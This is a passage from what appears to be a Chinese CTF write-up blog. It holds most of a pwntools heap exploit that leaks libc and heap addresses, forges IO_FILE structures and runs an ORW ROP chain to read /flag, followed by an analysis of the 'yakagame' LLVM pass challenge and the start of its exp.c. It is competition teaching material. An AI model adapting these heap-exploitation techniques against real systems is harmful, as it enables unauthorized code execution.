class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    cat()<br>    menu(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;plz input your content:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br>login()<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x428</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x458</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x468</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x219ce0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>rdi2rdx = libc_base + <span class="hljs-number">0x1675b0</span><br>dele(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;Context:\n&#x27;</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = heap_leak - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>dele(<span class="hljs-number">1</span>)<br>dele(<span class="hljs-number">3</span>)<br>stderr = <span class="hljs-number">0x21a860</span> + libc_base<br>_IO_wfile_jumps = <span class="hljs-number">0x2160c0</span> + libc_base<br>rdi = libc_base + <span class="hljs-number">0x000000000002a3e5</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002be51</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x000000000011f497</span><br>jmp_rsi = libc_base + <span class="hljs-number">0x000000000003d3cf</span><br>ret = libc_base + <span class="hljs-number">0x0000000000029cd6</span><br>rax = libc_base + <span class="hljs-number">0x0000000000045eb0</span><span class="hljs-comment"># 0x0000000000045eb0 : pop rax ; ret</span><br>addr =heap_base<br>rdi_rdx = libc_base + <span class="hljs-number">0x1675b0</span><br>syscall_ret = libc_base + <span class="hljs-number">0x0000000000091396</span> <span class="hljs-comment"># 0x0000000000091396: syscall; ret; </span><br><br>orw = flat([<br>    <span class="hljs-number">0</span>,rdi,<span class="hljs-number">0</span>,libc.sym.close,rax,<span class="hljs-number">2</span>,rdi,heap_base+<span class="hljs-number">0x2b0</span>,rsi,<span class="hljs-number">0</span>,syscall_ret,rdi,<span class="hljs-number">0</span>,rdx_r12,<span class="hljs-number">0x100</span>,<span class="hljs-number">0</span>,rsi,heap_base+<span class="hljs-number">0x290</span>+<span class="hljs-number">0x20</span>,libc.sym.read,rdi,<span class="hljs-number">1</span>,libc.sym.write<br>])+<span class="hljs-string">&#x27;/flag\0\0\0&#x27;</span><br>addr = heap_base+<span class="hljs-number">0x200</span><br>fuck = SigreturnFrame()<br>fuck.rdi = <span class="hljs-number">0</span><br>fuck.rsi = addr<br>fuck.rdx = <span class="hljs-number">0x300</span><br>fuck.rsp = addr + <span class="hljs-number">8</span><br>fuck.rip = libc.sym.read<br>guard = libc_base - <span class="hljs-number">0x2890</span><br>_IO_wstrn_jumps = libc_base + <span class="hljs-number">0x215dc0</span> - <span class="hljs-number">0x38</span> + <span class="hljs-number">24</span><br>_IO_cookie_jumps = libc_base +<span class="hljs-number">0x215b80</span> - <span class="hljs-number">0x38</span> + <span class="hljs-number">24</span><br>lg(<span class="hljs-string">&#x27;guard&#x27;</span>,guard)<br>payload = IO_FILE(_IO_read_end=<span class="hljs-number">1</span>,_IO_write_ptr=stderr-<span class="hljs-number">0x20</span>,_lock=heap_base+<span class="hljs-number">0x10</span>,_IO_chain=heap_base+<span class="hljs-number">0x3a0</span>,_wide_data=heap_base+<span class="hljs-number">0xc40</span>)[<span class="hljs-number">0x10</span>:]+p64(_IO_wfile_jumps)<br>payload = payload.ljust(<span class="hljs-number">0xf0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += <span class="hljs-built_in">str</span>(fuck)[:<span class="hljs-number">0xe0</span>]+p64(heap_base+<span class="hljs-number">0xd40</span>-<span class="hljs-number">0x68</span>)<br>payload = payload.ljust(<span class="hljs-number">0x1f0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>) + p64(magic)<br><br><br><span class="hljs-comment"># payload += IO_FILE(_IO_write_ptr=0xffffffffffffffff,_IO_chain=0,_lock=0) + p64(_IO_cookie_jumps + 0x60) + p64(heap_base+0x4a0) + p64(0) + p64(rol(rdi_rdx ^ (heap_base+0x390), 0x11,64))</span><br><span class="hljs-comment"># payload = payload.ljust(0x1f0,&#x27;\0&#x27;)</span><br><span class="hljs-comment"># payload += p64(0)+p64(heap_base+0x4a0)+p64(0)*2+p64(magic)+str(fuck)[0x28:]</span><br><span class="hljs-comment"># payload = payload.ljust(0x2f0,&#x27;\0&#x27;)</span><br><span class="hljs-comment"># payload += mmp</span><br><br>fake1 = libc_base + <span class="hljs-number">0x21a0e0</span><br>fake2 = heap_base + <span class="hljs-number">0x290</span><br><span class="hljs-comment"># add(4,0x458,&#x27;u&#x27;*0x20+payload[0x20:])</span><br><span class="hljs-comment"># add(5,0x458)</span><br><span class="hljs-comment"># add(6,0x448)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># add(7,0x468)</span><br><span class="hljs-comment"># dele(6)</span><br><span class="hljs-comment"># edit(4,p64(fake1)*2 + p64(fake2) + p64(stderr-0x20))</span><br><span class="hljs-comment"># add(8,0x420)</span><br><br><span class="hljs-comment"># dele(8)</span><br><span class="hljs-comment"># edit(4,p64(fake1)*2 + p64(fake2) + p64(0x7ffff7fa5ce0-0x20))</span><br><span class="hljs-comment"># add(9,0x420)</span><br><span class="hljs-comment"># add(10,0x468)</span><br><br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x448</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x458</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x450</span>+pack(-<span class="hljs-number">2059</span>))<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x458</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x20</span>+payload[<span class="hljs-number">0x20</span>:])<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x468</span>)<br>dele(<span class="hljs-number">4</span>)<br>edit(<span class="hljs-number">6</span>,p64(fake1)*<span class="hljs-number">2</span> + p64(fake2) + p64(stderr-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x420</span>)<br><br>dele(<span class="hljs-number">9</span>)<br>edit(<span class="hljs-number">6</span>,p64(fake1)*<span class="hljs-number">2</span> + p64(fake2) + p64(libc_base+<span class="hljs-number">0x219ce0</span>-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">10</span>,<span class="hljs-number">0x420</span>)<br><span class="hljs-comment"># add(11,0x468)</span><br>cat()<br>menu(<span class="hljs-string">&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;plz input your cat idx:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">11</span>))<br>sla(<span class="hljs-string">&#x27;plz input your cat size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x468</span>))<br><br>sleep(<span class="hljs-number">2</span>)<br>sl(orw)<br><br><span class="hljs-comment"># dele(9)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># dele(5)</span><br><span class="hljs-comment"># dele(4)</span><br><span class="hljs-comment"># add(10,0x458)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">b *0x7ffff7e011c8</span><br><span class="hljs-string">   0x7ffff7e011b4 &lt;__vfprintf_internal+260&gt;    cmp    rdi, rax</span><br><span class="hljs-string">   0x7ffff7e011b7 &lt;__vfprintf_internal+263&gt;    jbe    __vfprintf_internal+6560                &lt;__vfprintf_internal+6560&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e011bd &lt;__vfprintf_internal+269&gt;    mov    rsi, qword ptr [rsp + 8]</span><br><span class="hljs-string">   0x7ffff7e011c2 &lt;__vfprintf_internal+274&gt;    mov    rdx, rbx</span><br><span class="hljs-string">   0x7ffff7e011c5 &lt;__vfprintf_internal+277&gt;    mov    rdi, rbp</span><br><span class="hljs-string"> ► 0x7ffff7e011c8 &lt;__vfprintf_internal+280&gt;    call   qword ptr [r12 + 0x38]        &lt;0&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">   0x7ffff7e011cd &lt;__vfprintf_internal+285&gt;    cmp    rbx, rax</span><br><span class="hljs-string">   0x7ffff7e011d0 &lt;__vfprintf_internal+288&gt;    jne    __vfprintf_internal+5880                &lt;__vfprintf_internal+5880&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="yakagame"><a class="header-anchor" href="#yakagame">¶</a>yakagame</h3><p>Exp 有概率失败，但成功率很高。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731085710766.png" alt="exp"></p><h4 id="分析-v2"><a class="header-anchor" href="#分析-v2">¶</a>分析</h4><p>经典的 llvm pass pwn 题，蛋疼的是给出来的几个函数都没用，在上面浪费了太多的时间了。</p><p>关键函数:</p><p>1.后门函数，要求score&gt;0x12345678</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090206313.png" alt="yakagame1"></p><p>进入后会执行 cmd 指针内存放的内容。</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090304553.png" alt="yakagame2"></p><p>2.下标越界</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220731090050060.png" alt="yakagame3"></p><p>其中，<strong>v33 为 char 类型</strong> ，在函数数量足够多时可以遍历到<strong>负数</strong>下标，构成越界写。</p><p>思路：</p><ol><li>首先需要能够进入后门函数，我们需要在可控范围内找到一个内容 &gt; 0x12345678 的地址，这里我选的是 <code>stdout@got + 2</code> ，0x7f 开头的 8 个字节可以保证进入后门函数，利用越界写控制下标覆写 score 指针。</li><li>其次需要控制 cmd 的内容，理想状态应该选取 <code>/bin/sh\0</code> ，但我没能在固定地址找到，就选取了 <code>sh\0</code>，最终也成功完成了利用。</li></ol><h4 id="exp-c"><a class="header-anchor" href="#exp-c">¶</a>exp.c</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">fight</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> num)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n0</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n1</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n2</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n3</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n4</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n5</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n6</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n7</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">n8</span><span class="hljs-params">(<span 